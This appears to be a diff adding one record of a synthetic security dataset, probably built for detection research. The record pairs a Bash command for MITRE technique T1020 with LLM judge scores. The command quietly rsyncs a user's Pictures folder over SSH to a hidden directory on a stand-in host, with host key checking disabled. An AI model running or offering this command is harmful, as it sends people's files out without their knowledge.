@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "rsync -azq -e 'ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null' --rsync-path='mkdir -p ~/.cache/.upd && rsync' $HOME/Pictures/ backup@assets.example.org:~/.cache/.upd/pix/",
+  "explanation": "Uses rsync\u2019s remote command feature to create a hidden directory on the receiver before quietly transferring files over SSH, facilitating automated exfiltration (T1020).",
+  "rationale_steps": [
+    "Prepare a hidden destination on the remote host.",
+    "Leverage rsync\u2019s --rsync-path to run remote prep command.",
+    "Transfer data quietly over SSH without prompts.",
+    "Preserve structure and compress for efficiency."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-d10cd1e2-58ffd523",
+  "source_prompt_hash": "d10cd1e2",
+  "timestamp_utc": "2025-09-30T09:04:44.050324Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed rsync command with valid options, balanced quoting, and proper use of -e and --rsync-path.",
+        "semantic_score": 5,
+        "semantic_justification": "It quietly transfers the local Pictures directory over SSH to a hidden remote path, pre-creating it via --rsync-path and using non-interactive SSH options, matching automated exfiltration behavior (T1020).",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T03:25:04.718728Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with properly balanced quotes, valid rsync and SSH options, correct path specifications, and appropriate command structure.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements automated exfiltration by using rsync to quietly transfer files over SSH with automation-friendly options (BatchMode=yes, StrictHostKeyChecking=no), creating hidden directories (.cache/.upd) to conceal the exfiltrated data, and establishing a reliable transfer mechanism.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T03:25:07.760791Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags for rsync and ssh, and correctly structured remote commands via --rsync-path.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent of automated exfiltration (T1020) by using rsync over SSH with stealthy options like quiet mode, disabled host key checking for automation, and creating a hidden directory on the remote host for concealment.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T05:43:27.746082Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
